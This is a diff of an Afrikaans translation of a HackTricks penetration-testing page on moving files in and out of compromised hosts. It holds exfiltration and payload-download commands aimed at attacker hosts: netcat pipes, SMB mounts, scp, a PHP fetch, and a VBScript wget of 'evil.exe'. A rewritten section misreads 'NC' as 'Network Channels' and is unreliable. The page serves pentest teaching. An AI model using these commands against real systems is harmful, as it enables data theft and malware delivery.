@@ -14,9 +14,9 @@ Ander maniere om HackTricks te ondersteun:
 
 </details>
 
-**Try Hard Security Group**
+**Probeer Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -187,38 +187,17 @@ service smbd restart
 ```
 ### Exfiltration
 
-#### Introduction
+Exfiltration is the unauthorized transfer of data from a target system. There are various methods to exfiltrate data from a compromised system, including:
 
-Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as:
-
-- **Email**: Sending sensitive data as email attachments.
-- **FTP**: Uploading data to an FTP server.
-- **DNS**: Sending data encoded in DNS queries.
+- **Email**: Sending data as email attachments.
+- **FTP**: Transferring data using the File Transfer Protocol.
 - **HTTP/HTTPS**: Sending data over HTTP or HTTPS protocols.
+- **DNS**: Using DNS requests to exfiltrate data.
+- **Steganography**: Hiding data within other files or images.
 - **Cloud Storage**: Uploading data to cloud storage services.
+- **External Drives**: Copying data to external drives for physical exfiltration.
 
-#### Techniques
-
-1. **Compression**: Compressing data before exfiltration to reduce size and avoid detection.
-2. **Encryption**: Encrypting data to prevent unauthorized access.
-3. **Steganography**: Hiding data within other files to avoid detection.
-4. **Data Fragmentation**: Splitting data into smaller fragments for exfiltration.
-5. **Data Obfuscation**: Encoding data to make it unreadable without decoding.
-
-#### Tools
-
-- **Netcat**: A versatile networking tool that can be used for exfiltration.
-- **Curl**: Command-line tool for transferring data with various protocols.
-- **Wget**: Another command-line tool for downloading files from the web.
-- **FTP Clients**: Software for uploading files to FTP servers.
-- **Cloud Storage APIs**: APIs provided by cloud storage services for data transfer.
-
-#### Countermeasures
-
-- **Data Loss Prevention (DLP)**: Implement DLP solutions to monitor and prevent data exfiltration.
-- **Network Segmentation**: Segment networks to limit unauthorized access to sensitive data.
-- **Encryption**: Encrypt data at rest and in transit to protect it from unauthorized access.
-- **User Training**: Educate users about the risks of data exfiltration and how to prevent it.
+It is essential for hackers to choose the exfiltration method carefully to avoid detection and successfully transfer the stolen data.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -228,7 +207,7 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-Die aanvaller moet SSHd aan die gang hê.
+Die aanvaller moet SSHd hardloop.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
@@ -242,27 +221,30 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-### Netcat
+### Network Channels
 
-Netcat is a versatile networking utility that can be used for various purposes, including transferring files, port scanning, and creating reverse shells. It can also be used for exfiltration by sending data over the network to an external server controlled by the attacker.
+#### Description
 
-#### Exfiltration with Netcat
+Network Channels (NC) are techniques used to exfiltrate data over network protocols. This can include common protocols such as HTTP, DNS, ICMP, or even custom protocols developed for a specific operation. Network Channels are often used during post-exploitation phases to avoid detection and blend in with normal network traffic.
 
-To exfiltrate data using Netcat, the attacker sets up a listener on a remote server using the following command:
+#### Detection
 
-```bash
-nc -l -p <port> > output.file
-```
+Detection of data exfiltration over network channels can be challenging due to the variety of protocols and the potential for encryption. Monitoring network traffic for anomalies, such as large amounts of data being sent over uncommon protocols or at unusual times, can help in detecting potential exfiltration attempts.
 
-Next, on the compromised machine, the attacker pipes the data to be exfiltrated into Netcat using a command similar to the following:
+#### Tools
 
-```bash
-cat sensitive.file | nc <remote_ip> <port>
-```
+- **Wireshark**: A widely used network protocol analyzer that can capture and interactively browse the traffic running on a computer network.
+- **tcpdump**: A command-line packet analyzer that allows the user to capture or filter TCP/IP packets that are transmitted or received over a network.
+- **Bro/Zeek**: A powerful network analysis framework that can help in monitoring network traffic and detecting suspicious activities, including data exfiltration.
 
-This command sends the contents of `sensitive.file` to the remote server listening on `<remote_ip>` and `<port>`. The data is then saved to `output.file` on the remote server.
+#### Mitigation
 
-Netcat can be a powerful tool for exfiltrating data during a penetration test, but it is essential to ensure that the exfiltration process is stealthy to avoid detection by security measures.
+To mitigate the risk of data exfiltration over network channels, organizations can implement the following measures:
+
+- **Network Segmentation**: Segregate sensitive data into separate network segments to limit the potential impact of a data breach.
+- **Deep Packet Inspection**: Use deep packet inspection tools to analyze network traffic for signs of data exfiltration.
+- **Encryption**: Implement strong encryption protocols to protect data in transit and prevent unauthorized access.
+- **Network Monitoring**: Continuously monitor network traffic for unusual patterns or activities that may indicate data exfiltration attempts.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -335,7 +317,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-VBScript is 'n skripsie taal wat deur Microsoft ontwikkel is en dikwels gebruik word vir Windows-gebaseerde skripsies en automatiseringstake. VBScript kan gebruik word vir die uitvoer van data-ekstraksie deur die gebruik van HTTP-aanvrae of e-posse.
+VBScript is 'n skripsie taal wat deur Microsoft ontwikkel is en dikwels gebruik word vir Windows-gebaseerde skripsies en automatiseringstake. VBScript kan gebruik word vir die uitvoer van data exfiltration deur die gebruik van HTTP-aanvrae na 'n eksterne bediener. Hierdie tegniek kan gebruik word om gesteelde data van 'n geteikenrekenaar na 'n aanvaller se bediener te stuur.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -373,7 +355,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Die `debug.exe` program maak dit nie net moontlik om binêre lêers te inspekteer nie, maar het ook die **vermoë om hulle vanaf heks te herbou**. Dit beteken dat deur 'n heks van 'n binêre lêer te voorsien, `debug.exe` die binêre lêer kan genereer. Dit is egter belangrik om daarop te let dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte saam te stel**.
+Die `debug.exe` program maak dit nie net moontlik om binêre lêers te inspekteer nie, maar het ook die **vermoë om hulle vanaf heks te herbou**. Dit beteken dat deur 'n heks van 'n binêre lêer te voorsien, kan `debug.exe` die binêre lêer genereer. Dit is egter belangrik om daarop te let dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte saam te stel**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -390,13 +372,13 @@ Dan kopieer en plak die teks in die Windows-skootrekenaar en 'n lêer genaamd nc
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
-<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Ander maniere om HackTricks te ondersteun:
 
